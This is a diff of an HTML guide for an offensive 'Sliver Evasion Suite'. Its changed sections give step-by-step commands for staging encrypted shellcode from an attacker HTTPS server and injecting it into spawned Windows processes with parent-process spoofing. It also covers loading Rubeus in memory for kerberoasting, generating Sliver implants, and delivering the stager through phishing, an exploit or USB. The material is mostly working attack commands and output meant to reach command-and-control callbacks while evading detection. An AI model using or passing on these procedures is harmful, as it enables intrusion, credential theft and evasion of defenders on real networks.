           <h4>6.9.4 Spawn + Inject with PPID Spoof</h4>
-<pre><code class="language-bash">sliver (TARGET)&gt; inject url=https://192.168.1.10:8443/r key=a1b2c3... spawn=dllhost.exe ppid=svchost.exe
+<pre><code class="language-bash">sliver (TARGET)&gt; inject url=https://192.168.1.10:8443/f7e2a91b3c04d58e key=b9c8d7e6f5a4... spawn=dllhost.exe ppid=svchost.exe
 [+] spawned dllhost.exe (pid 7890) with ppid spoofed to svchost.exe — shellcode running</code></pre>
           <p>Your second beacon calls back from inside <code>dllhost.exe</code>, looking like a child of <code>svchost.exe</code> to everything that reads the process tree.</p>
 
@@ -1183,16 +1210,17 @@ cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/palacekit
           <h3>8.2 Phase 2 &mdash; Stage and Inject (First Session, No Existing Sliver Session)</h3>
           <p>No Sliver session yet &mdash; use the InjectKit standalone runner to deliver the payload from initial access.</p>
 <pre><code class="language-bash"># Operator: encrypt and start the one-shot staging server
-cd /home/kali/Sliver-Evasion-Suite/Inject-Kit/injectkit
-./injectkit stage --shellcode palace.bin --url https://192.168.1.10:8443/p --serve
+cd Inject-Kit/injectkit
+./injectkit stage --shellcode palace.bin --url https://192.168.1.10:8443 --serve
 
 # Output:
-# [+] XOR key: a1b2c3d4...
 # [+] payload → build/payload.enc
-# [*] One-shot HTTPS server on :8443 ...
+# [+] key     → a1b2c3d4...
+# [*] One-shot HTTPS server on :8443 — shuts down after one download
+# [+] Staging URL: https://192.168.1.10:8443/a3f91c04b2e8d17f
 #
 # Run on target:
-#   injectkit.exe -mode stager -url https://192.168.1.10:8443/p \
+#   injectkit.exe -mode stager -url https://192.168.1.10:8443/a3f91c04b2e8d17f \
 #                 -key a1b2c3d4... -spawn RuntimeBroker.exe -ppid explorer.exe</code></pre>
           <p>Deliver <code>injectkit.exe</code> to the target via phishing, exploit, or USB &mdash; whatever gave initial access. Run the printed command.</p>
           <p><code>RuntimeBroker.exe</code> appears in the process tree under <code>explorer.exe</code>. Its memory contains the PalaceKit shellcode &rarr; which decrypts and runs the MaskKit masker &rarr; which decrypts and runs Sliver. Callback arrives. <strong>First session established.</strong></p>
@@ -1200,13 +1228,19 @@ cd /home/kali/Sliver-Evasion-Suite/Inject-Kit/injectkit
           <h3>8.3 Phase 3 &mdash; Tool Execution in Session (LoadKit)</h3>
           <p>You&rsquo;re in the session. Run Rubeus kerberoasting without writing to disk:</p>
 <pre><code class="language-bash"># Operator: convert Rubeus to Donut shellcode, XOR-encrypt, serve
-cd /home/kali/Sliver-Evasion-Suite/Loader-Kit/loadkit
+cd Loader-Kit/loadkit
 ./loadkit load \
-    --binary /home/kali/tools/Rubeus.exe \
+    --binary Rubeus.exe \
     --args "kerberoast /nowrap" \
-    --url https://192.168.1.10:8443/q \
-    --serve</code></pre>
-<pre><code class="language-bash">sliver (TARGET)&gt; load url=https://192.168.1.10:8443/q key=&lt;hex&gt;</code></pre>
+    --url https://192.168.1.10:8443 \
+    --serve
+
+# [+] payload → build/payload.enc
+# [+] key     → c3d4e5f6a7b8...
+# [*] One-shot HTTPS server on :8443 — shuts down after one download
+# [+] Staging URL: https://192.168.1.10:8443/e1d2c3b4a5960718
+#     sliver (TARGET)> load url=https://192.168.1.10:8443/e1d2c3b4a5960718 key=c3d4e5f6a7b8...</code></pre>
+<pre><code class="language-bash">sliver (TARGET)&gt; load url=https://192.168.1.10:8443/e1d2c3b4a5960718 key=c3d4e5f6a7b8...</code></pre>
 <pre><code class="language-bash">   ______        _
   (_____ \      | |
    _____) )_   _| |__  _____ _   _  ___
@@ -1225,12 +1259,14 @@ $krb5tgs$23$*svc_sql$CORP.LOCAL$...HASH...*</code></pre>
 <pre><code class="language-bash"># Operator: generate a fresh shellcode, wrap with PalaceKit, stage
 sliver &gt; generate --format shellcode --os windows --arch amd64 --mtls 192.168.1.10 --save implant2.bin
 
-cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/palacekit
+cd Crystal-Palace-Kit/palacekit
 ./palacekit build --shellcode implant2.bin --output palace2.bin
 
-cd /home/kali/Sliver-Evasion-Suite/Inject-Kit/injectkit
-./injectkit stage --shellcode palace2.bin --url https://192.168.1.10:8443/r --serve</code></pre>
-<pre><code class="language-bash">sliver (TARGET)&gt; inject url=https://192.168.1.10:8443/r key=&lt;hex&gt; spawn=dllhost.exe ppid=svchost.exe
+cd Inject-Kit/injectkit
+./injectkit stage --shellcode palace2.bin --url https://192.168.1.10:8443 --serve
+
+# [+] Staging URL: https://192.168.1.10:8443/f7e2a91b3c04d58e</code></pre>
+<pre><code class="language-bash">sliver (TARGET)&gt; inject url=https://192.168.1.10:8443/f7e2a91b3c04d58e key=&lt;hex&gt; spawn=dllhost.exe ppid=svchost.exe
 [+] spawned dllhost.exe (pid 7890) with ppid spoofed to svchost.exe — shellcode running</code></pre>
           <p>Second Sliver session calls back from inside <code>dllhost.exe</code>, appearing to be a child of <code>svchost.exe</code> in all process-tree views. You now have two independent sessions; losing one doesn&rsquo;t end the engagement.</p>
 
@@ -1291,7 +1327,7 @@ go build -o sleepkit ./cmd/sleepkit
 
 # Crystal Palace Kit — PalaceKit (free Crystal Palace replacement)
 cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/palacekit
-make all          # 8 COFF loader objects + palacekit CLI
+make all          # unity build (loader.x64.o) + 5 stub objects + palacekit CLI
 
 # Crystal Palace Kit — CrystalKit (operator workflow)
 cd /home/kali/Sliver-Evasion-Suite/Crystal-Palace-Kit/crystalkit
